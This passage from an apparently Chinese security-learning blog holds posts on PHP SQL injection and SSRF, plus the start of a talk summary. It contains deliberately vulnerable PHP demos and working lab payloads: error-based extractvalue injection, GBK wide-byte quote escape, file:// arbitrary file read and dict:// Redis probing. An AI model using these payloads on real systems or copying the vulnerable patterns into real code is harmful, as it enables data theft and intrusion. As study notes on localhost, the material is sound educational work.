<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="mysqli-error"><a href="#mysqli-error" class="headerlink" title="mysqli_error()"></a>mysqli_error()</h3><table><tr><td bgcolor="yellow">条件:</td></tr></table>

<ul>
<li>对传入的参数 <strong>未做过滤</strong> 直接拼接到SQL语句中执行</li>
<li>直接使用<code>mysqli_error()</code>进行报错处理且没有对报错信息进行良好的处理</li>
</ul>
<p>测试demo</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: text/heml;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$servername</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">;</span>
    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span>
    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"F01"</span><span class="token punctuation">;</span>
    <span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"demo"</span><span class="token punctuation">;</span>

    <span class="token comment">// 创建链接</span>
    <span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token variable">$servername</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$dbname</span><span class="token punctuation">,</span><span class="token number">3306</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 检查链接</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$conn</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"连接失败: "</span> <span class="token operator">.</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM user WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token comment">//惊为天人的是，这里我把id=打错成了id-，但是依旧有效运行</span>
    <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$row</span><span class="token operator">=</span>@<span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Your name is: "</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"your psw: "</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//这里也有一个mysqli_errno()函数，当时可能没注意直接回车……但依旧有效……</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>进行正常测试：</p>
<p><code>http://localhost:63342/demo/error.php?id=1</code></p>
<p>返回：</p>
<p><code>Your name is: John&lt;br&gt;your psw: daidgiaegigak</code><br><code>Your name is: Amy&lt;br&gt;your psw: sfggregea</code></p>
<p>如果进行错误测试：</p>
<p><code>http://localhost:63342/demo/error.php?id=1&#39;</code></p>
<p>报错：</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">&lt;br />
&lt;b>Fatal error&lt;/b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1 in C:\Users\fk\PhpstormProjects\demo\error.php:17

Stack trace:
#0 C:\Users\fk\PhpstormProjects\demo\error.php(17): mysqli_query(Object(mysqli), 'SELECT * FROM u...')//出现表名

#1 &#123;main&#125;
  thrown in &lt;b>C:\Users\fk\PhpstormProjects\demo\error.php&lt;/b> on line &lt;b>17&lt;/b>&lt;br /><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<br>
<br>

<p>其实看第一段的<code>near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39;</code>就行，一个报错注入就可以出现雏形。</p>
<p><code>id=1&#39; or 1=1--+</code>就正常输出，回头去看源码</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//...</span>
<span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token comment">//...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>


<p><code>id=1&#39;</code>相当于<code>$id=$_GET[&#39;1&#39;&#39;]</code>。<br><code>id=1&#39; or 1=2 --+</code>相当于<code>&#39;1&#39; or 1=2--+&#39;</code>即<code>$_GET[&#39;1&#39; or 1=2]</code></p>
<br>
<br>

<p>一点简单的测试之后，</p>
<br>
<br>

<p>在按部就班的测试之后就可以构造payload：<br><code>http://demo/error.php?id=1%27%20and%20(select%20extractvalue(%22anything%22,concat(%27~%27,(user()))))%20--%20qwe</code></p>
<p>就可以通过报错回显得到：<code>XPATH syntax error: &#39;~root@localhost&#39;</code></p>
<hr>

<p>一个番外，当我不小心把那个单引号打成中文单引号，就无事发生——没有报错，依旧正常输出。<br>具体原因，tbc。</p>
<hr>
<hr>

<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>mysql的gbk编码是多字节编码，两个字节代表一个汉字，<code>%df</code> + <code>\</code>会组成一个汉字，所以利用这个特性进行<code>&#39;</code>的逃逸，构成sql注入。</p>
<h3 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes()"></a>addslashes()</h3><p>该函数对预定义的字符进行 前加\ 操作</p>
<p><strong>预定义的字符</strong>：</p>
<ul>
<li><p>单引号</p>
</li>
<li><p>双引号</p>
</li>
<li><p>反斜杠</p>
</li>
<li><p>NULL</p>
</li>
</ul>
<hr>

<p>进行测试</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">//testdemo
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: text/heml;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$servername</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">;</span>
    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span>
    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Flaskon0801"</span><span class="token punctuation">;</span>
    <span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"demo"</span><span class="token punctuation">;</span>

    <span class="token comment">// 创建链接</span>
    <span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token variable">$servername</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$dbname</span><span class="token punctuation">,</span><span class="token number">3306</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"SET NAMES 'gbk'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置MySQL字符编码为gbk</span>
    <span class="token comment">// 检查链接</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$conn</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"连接失败: "</span> <span class="token operator">.</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$id</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//$id=$_GET['id'];</span>
    <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM user WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"sql thing: "</span> <span class="token operator">.</span><span class="token variable">$sql</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$row</span><span class="token operator">=</span>@<span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Your name is: "</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"your psw: "</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>进行测试</strong></p>
<p>1.<code>id=%27%27</code><br>报错：<br><code>sql thing: SELECT * FROM user WHERE id=&#39;\&#39;\&#39;&#39; LIMIT 0,1&lt;br&gt;&lt;br&gt;</code></p>
<p>2.<code>id=1%27%df%20or%201=2--+</code></p>
<p><code>sql thing: SELECT * FROM user WHERE id=&#39;1\&#39;� or 1=2-- &#39; LIMIT 0,1&lt;br&gt;&lt;br&gt;Your name is: John&lt;br&gt;your psw: daidgiaegigak</code></p>
<p>3.<code>id=1%df%27%20or%201=2--+</code></p>
<p><code>sql thing: SELECT * FROM user WHERE id=&#39;1�\&#39; or 1=2-- &#39; LIMIT 0,1&lt;br&gt;&lt;br&gt;Your name is: John&lt;br&gt;your psw: daidgiaegigak</code></p>
<p>第三条就是我们所说的组成汉字，</p>
<p><code>�\</code>变成一个汉字（这里解析不出来），所以 id &#x3D; ‘1’ or 1&#x3D;2,单引号逃逸成功，也就成功执行了sql注入。</p>
<p>还可以换其他sql注入语句，这里只是简单测试就不写了。</p>
<p>值得研究的是，第二条，也是打错了的，但是注入依旧成功了——是注释的作用还是反斜杠的注释作用？</p>
<hr>
<hr>

<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><hr>

<p>(SQL注入)[<a href="https://ctf-wiki.org/web/sqli/]">https://ctf-wiki.org/web/sqli/]</a></p>
]]></content>
      <tags>
        <tag>LEARN</tag>
        <tag>PHP</tag>
        <tag>SQL-Injection</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP_SSRF</title>
    <url>/rustymoon/2023/11/13/PHP-SSRF/</url>
    <content><![CDATA[<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p><strong>SSRF–服务端请求伪造</strong></p>
<blockquote>
<p>服务端伪造请求（Server-Side Request Forgery，SSRF）是一种安全漏洞，攻击者通过操纵服务器发起的请求，使其访问目标服务器或资源，从而在服务端执行未经授权的操作。这种攻击通常发生在应用程序未正确验证或过滤用户提供的输入数据时。</p>
</blockquote>
<span id="more"></span>

<h2 id="SSRF-的一般工作原理和攻击场景："><a href="#SSRF-的一般工作原理和攻击场景：" class="headerlink" title="SSRF 的一般工作原理和攻击场景："></a>SSRF 的一般工作原理和攻击场景：</h2><ul>
<li><p>用户输入未经验证： 应用程序接收用户提供的 URL 或其他输入，但未正确验证或过滤该输入。</p>
</li>
<li><p>攻击者构造恶意请求： 攻击者通过在用户输入中插入恶意的 URL，构造一个特殊的请求，使服务器在其内部网络中访问或执行操作。</p>
</li>
<li><p>利用服务端发起请求： 服务器使用用户提供的输入作为目标地址，发起一个 HTTP、DNS 或其他类型的请求。</p>
</li>
<li><p>攻击目标： 请求可能指向内部网络资源、本地文件系统、或其他敏感信息。攻击者的目标是获取未经授权的数据、执行操作，或者进一步滥用内部网络。</p>
</li>
</ul>
<hr>

<h2 id="SSRF-可能导致以下安全问题："><a href="#SSRF-可能导致以下安全问题：" class="headerlink" title="SSRF 可能导致以下安全问题："></a>SSRF 可能导致以下安全问题：</h2><ul>
<li><p>内部资源访问： 攻击者可以尝试访问服务器内部网络中的敏感资源，如数据库、内部API或其他服务。</p>
</li>
<li><p>绕过防火墙： 通过将请求发送到内部网络，攻击者可能绕过防火墙和网络隔离的保护措施。</p>
</li>
<li><p>信息泄露： 攻击者可以通过观察请求的响应来收集关于目标系统的信息，如错误消息、调试信息等。</p>
</li>
</ul>
<hr>

<h2 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h2><ul>
<li><p>对用户输入进行严格的验证和过滤，确保输入数据是合法的 URL，并限制访问的范围。</p>
</li>
<li><p>在服务器配置中，避免将用户提供的输入作为请求目标，特别是在涉及敏感操作的情况下。</p>
</li>
<li><p>使用白名单机制，只允许服务器访问预定义的、受信任的目标。<br>配置网络安全组和防火墙规则，限制服务器的出站访问。</p>
</li>
</ul>
<h1 id="导致SSRF危险函数"><a href="#导致SSRF危险函数" class="headerlink" title="导致SSRF危险函数"></a>导致SSRF危险函数</h1><h2 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h2><blockquote>
<p>用该函数发起请求会用到libcurl库，该库支持HTTP，HTTPS，FTP，GOPHER，TELNET，DICT，FILE，IDAP协议。</p>
<blockquote>
<p>curl_exec() - 执行一个CURL会话</p>
</blockquote>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">//demo.php
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: text/html; charset = utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_SSL_VERIFYPEER</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_FOLLOWLOCATION</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>运行之后as you can see：</p>
<img src="/rustymoon/2023/11/13/PHP-SSRF/PHP_SSRF.png" class title="SSRFpic">


<h2 id="file-contents"><a href="#file-contents" class="headerlink" title="file_contents()"></a>file_contents()</h2><p>比前者更为简洁的代码，实现一样的功能</p>
<p>file_contents(path, include_path, context, start, max_length):</p>
<ul>
<li>path 必需。所读取文件名（如果没有会报错no suc）</li>
<li>include_path </li>
<li>context</li>
<li>start 开始读取的位置</li>
<li>max_length 读取的字节数</li>
</ul>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">//一个demo
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: text/html; charset = utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>效果如下</p>
<img src="/rustymoon/2023/11/13/PHP-SSRF/file.png" class>

<p>然后尝试同文件夹下读取文件内容</p>
<img src="/rustymoon/2023/11/13/PHP-SSRF/atz.png" class>

<p>在测试其他位置文件之后得出：<br>只要路径正确，任意文件均可读取。</p>
<hr>

<h2 id="fopen-filename-mode-include-path-context"><a href="#fopen-filename-mode-include-path-context" class="headerlink" title="fopen(filename, mode, include_path, context)"></a>fopen(filename, mode, include_path, context)</h2><p>filename参数可控就会带来SSRF攻击</p>
<p>看这个初始化界面warning其实也可以进一步理解一下这个函数，必需的变量就是filename，而在后续的<code>url=http://www.baidu.com</code>中又可以知道，这个filename不一定是要filename，网址也可以，这也就导致了服务端伪造请求。</p>
<img src="/rustymoon/2023/11/13/PHP-SSRF/fopen%E5%88%9D%E5%A7%8B%E5%8C%96.png" class>

<hr>

<h2 id="fsockopen-hostname-port-error-errstr-timeout"><a href="#fsockopen-hostname-port-error-errstr-timeout" class="headerlink" title="fsockopen(hostname, port, [error], [errstr], [timeout])"></a>fsockopen(hostname, port, [error], [errstr], [timeout])</h2><p>hostname，port参数可控就有风险</p>
<hr>

<p>这类函数漏洞都是因为参数可控导致的。</p>
<p>在函数之外还有协议带来的ssrf问题。</p>
<hr>

<h1 id="导致SSRF危险协议"><a href="#导致SSRF危险协议" class="headerlink" title="导致SSRF危险协议"></a>导致SSRF危险协议</h1><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p><code>HTTP</code>一般使用它的请求<code>GET</code>来获取资源，也可以结合intruder用作一个简单的扫描端口。</p>
<p><code>file</code>协议通过文件相对路径和echo等回显条件进行任意文件读取。</p>
<p>举个例子：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: text/html; charset = utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_SSL_VERIFYPEER</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_FOLLOWLOCATION</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>假设运行的网址是：<br><code>http://localhost:63342/testtt/ssrfdemo.php</code></p>
<p>构造一个file协议的url：</p>
<p><code>http://localhost:63342/testtt/ssrfdemo.php?url=file:///C:/Gods.txt</code></p>
<p>得到了Gods.txt的内容回显。</p>
<p>curl虽然没有echo，但它通过指向HTTP请求，将请求的内容获取到，这些内容变成HTTP响应的一部分返回，也就做到了内容的回显，完成任意文件读取。</p>
<h2 id="获取服务的banner"><a href="#获取服务的banner" class="headerlink" title="获取服务的banner"></a>获取服务的banner</h2><blockquote>
<p>网络服务是一种在计算机网络上运行的应用程序或进程，它提供某种功能或服务。</p>
</blockquote>
<blockquote>
<p>服务 banner 是指在与服务建立连接时服务所返回的信息，通常包含有关服务的版本、类型和其他相关信息。</p>
</blockquote>
<ul>
<li>“有 banner 的服务” 是指在与客户端建立连接时，服务会发送一段包含有关服务的信息的文本。这段信息通常包括有关服务的类型、版本和其他相关信息。这个信息传输的过程就是服务发送 banner。</li>
</ul>
<br>

<p>举例来说，一个 Web 服务器的 banner 信息可能包含有关服务器软件和版本的信息，如 “Apache&#x2F;2.4.29 (Ubuntu)”。类似地，SSH 服务可能在连接时发送 banner，例如 “SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2”。</p>
<p>在网络安全和渗透测试中，分析服务的 banner 信息是一种常见的方法，因为这可以提供有关目标系统的有用信息。这些信息可能包括已知的漏洞、弱点或系统配置的信息，为安全研究人员、渗透测试人员或攻击者提供了更深入的了解。</p>
<hr>
<h2 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h2><blockquote>
<p>Dict（Dictionary）协议主要用于在计算机网络中传输键值对。这种协议的基本思想是在客户端和服务器之间交换包含键值对信息的消息。</p>
</blockquote>
<p>用数据库开源系统redis举例：</p>
<p>（在 Redis 中，Dict 协议是一种用于与 Redis 服务器进行通信的协议。客户端通过向 Redis 服务器发送符合 Dict 协议的命令，实现对键值对存储的操作，如设置值、获取值、删除键等。Redis 本质上是一个键值对存储系统，它支持多种数据结构，包括字符串、哈希表、列表、集合等，而 Dict 协议用于与这些数据结构进行交互。）</p>
<p>只是简单举一个例子：<br><strong>获取redis信息</strong></p>
<p><code>http://localhost:63342/demo/demotest.php?url=dict://127.0.0.1:6379/info</code></p>
<img src="/rustymoon/2023/11/13/PHP-SSRF/redisinfo.png" class>



<p>虽然 Redis 是一个非常典型的使用 Dict 协议的系统，但 Dict 协议本身并不局限于 Redis。它是一种通用的键值对传输协议，可以被应用于其他需要在客户端和服务器之间传输键值对信息的场景。在某些情况下，开发人员可能会实现自己的应用层协议，以适应特定的应用需求。</p>
]]></content>
      <tags>
        <tag>PHP</tag>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>Read-How</title>
    <url>/rustymoon/2023/11/16/Read-How/</url>
    <content><![CDATA[<p>读了Mark Dowd在Offensive Con的演讲的一些摘要。</p>
<span id="more"></span>

<h1 id="我的摘要"><a href="#我的摘要" class="headerlink" title="我的摘要"></a>我的摘要</h1><p>不是全部，只是摘写了我认为重要的。</p>
<h2 id="方法论"><a href="#方法论" class="headerlink" title="方法论"></a>方法论</h2><h3 id="心态"><a href="#心态" class="headerlink" title="心态"></a>心态</h3><img src="/rustymoon/2023/11/16/Read-How/1.png" class title="一些必备的特质">

<p>允许我用某三部曲来形容（因为真的很贴）</p>
<ul>
<li><table><tr><td bgcolor="CCCCFF">FEARLESS</td></tr></table> </li>
<li><table><tr><td bgcolor="CCCCFF">ANTIFRAIGLE</td></tr></table></li>
<li><table><tr><td bgcolor="CCCCFF">UNFORGIVEN</td></tr></table></li>
</ul>
<p><font size="1">如果你懂那么你就会懂…</font></p>
